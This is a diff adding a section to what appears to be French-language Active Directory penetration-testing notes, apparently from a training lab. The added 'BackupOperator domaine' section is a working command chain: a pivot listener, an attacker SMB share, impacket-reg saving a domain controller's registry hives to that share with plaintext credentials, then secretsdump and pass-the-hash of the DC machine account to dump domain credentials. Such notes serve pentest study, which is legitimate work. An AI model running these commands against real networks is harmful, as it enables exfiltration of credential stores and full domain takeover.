@@ -142,3 +142,24 @@ nxc ldap <DC_IP> -u attacker -p ‘Password123’ -M laps
 * **Resource-Based Constrained Delegation (RBCD)** : si contrôle sur un objet machine.
 * **DCSync** : si accès à `Replicating Directory Changes (All)` sur le domaine.
 * SeEnableDelegationPrivilege : délégation de contrainte.
+## BackupOperator domaine
+
+```bash
+listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
+```
+
+```bash
+impacket-smbserver -smb2support someshare ./
+```
+
+```bash
+impacket-reg medtech.com/joe:'Flowers1'@172.16.190.10 backup -o '\\<IP_PIVOT>\someshare\'
+```
+
+```bash
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+
+```bash
+impacket-secretsdump medtech.com/'DC01$'@172.16.190.10 -hashes aad3b435b51404eeaad3b435b51404ee:2e283e8ba256451651cacb72e8fac449
+```
